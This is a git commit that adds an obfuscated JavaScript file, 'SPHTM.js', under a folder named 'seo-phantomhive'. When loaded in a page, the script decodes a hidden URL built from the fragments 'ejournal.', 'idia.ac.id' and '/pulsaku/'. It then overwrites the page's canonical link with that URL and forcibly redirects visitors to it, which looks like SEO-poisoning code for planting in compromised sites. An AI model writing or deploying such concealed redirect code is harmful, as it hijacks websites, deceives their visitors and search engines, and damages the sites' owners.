d0e40853134ca0b082d51a9ebb06380ed4415dd0
Z4PHY <mahardidono@gmail.com>
2024-02-23 01:59:14 +0700

    Z4PHY

---
+++ other/seo-phantomhive/js/SPHTM.js
@@ -0,0 +1,63 @@
+function _0x459c(_0x1e293a, _0x5bc93f) {
+  var _0x4d0886 = _0x4d08();
+  return (
+    (_0x459c = function (_0x459c84, _0x1b9c75) {
+      _0x459c84 = _0x459c84 - 0x190;
+      var _0x3e356b = _0x4d0886[_0x459c84];
+      return _0x3e356b;
+    }),
+    _0x459c(_0x1e293a, _0x5bc93f)
+  );
+}
+function _0x4d08() {
+  var _0x1343ee = [
+    "1994516tcrpei",
+    "4EHhiZG",
+    "2388qoMliF",
+    "1441270ntNXeT",
+    "1FjjhaA",
+    "90101AikizB",
+    "href",
+    "link[rel=\x27canonical\x27]",
+    "https://",
+    "setAttribute",
+    "ejournal.",
+    "54TXHvWw",
+    "7652672xdVmQp",
+    "idia.ac.id",
+    "5214285FRONzc",
+    "6461077GNopKK",
+    "6qEBxhr",
+    "/pulsaku/",
+    "1889709zyMqVH",
+  ];
+  _0x4d08 = function () {
+    return _0x1343ee;
+  };
+  return _0x4d08();
+}
+var _0x6fe252 = _0x459c;
+(function (_0x330f5e, _0x4f7dc0) {
+  var _0x4a549c = _0x459c,
+    _0x34d156 = _0x330f5e();
+  while (!![]) {
+    try {
+      var _0x57f3b6 =
+        (-parseInt(_0x4a549c(0x19c)) / 0x1) * (parseInt(_0x4a549c(0x198)) / 0x2) +
+        (parseInt(_0x4a549c(0x197)) / 0x3) * (-parseInt(_0x4a549c(0x199)) / 0x4) +
+        parseInt(_0x4a549c(0x193)) / 0x5 +
+        (parseInt(_0x4a549c(0x195)) / 0x6) * (parseInt(_0x4a549c(0x194)) / 0x7) +
+        parseInt(_0x4a549c(0x192)) / 0x8 +
+        (parseInt(_0x4a549c(0x191)) / 0x9) * (parseInt(_0x4a549c(0x19b)) / 0xa) +
+        (parseInt(_0x4a549c(0x19d)) / 0xb) * (-parseInt(_0x4a549c(0x19a)) / 0xc);
+      if (_0x57f3b6 === _0x4f7dc0) break;
+      else _0x34d156["push"](_0x34d156["shift"]());
+    } catch (_0x349308) {
+      _0x34d156["push"](_0x34d156["shift"]());
+    }
+  }
+})(_0x4d08, 0x8167c);
+var baseURL = _0x6fe252(0x196),
+  canonicalLink = document["querySelector"](_0x6fe252(0x19f));
+canonicalLink !== null ? ((canonicalLink["href"] = baseURL), canonicalLink[_0x6fe252(0x190)](_0x6fe252(0x19e), baseURL)) : ((canonicalLink[_0x6fe252(0x19e)] = baseURL), canonicalLink[_0x6fe252(0x190)](_0x6fe252(0x19e), baseURL));
+window["location"][_0x6fe252(0x19e)] !== baseURL && (window["location"]["href"] = baseURL);
